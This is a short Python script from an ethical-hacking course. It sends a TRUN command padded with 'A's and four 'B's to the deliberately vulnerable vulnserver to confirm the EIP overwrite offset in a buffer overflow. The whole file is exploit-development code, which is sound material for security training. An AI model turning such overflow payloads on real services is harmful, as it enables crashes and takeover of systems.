#!/usr/bin/python
# for https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course
# not an original work

# sends a custom sized payload to TRUN method of vulnserver to verify EIP overwrite offset
# usage: ./eipwriter.py <IPv4 address> <port #> <EIP offset>
import sys, socket


HOST = sys.argv[1] 
PORT = int(sys.argv[2])
OFFSET = int(sys.argv[3])

pattern = "A" * OFFSET + "B" * 4

try:
    payload = "TRUN /.:/" + pattern

    # setup IPV4 TCP socket 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST,PORT))

    s.send((payload))
    s.close()

except:
    print ("error connecting to server")
    sys.exit()
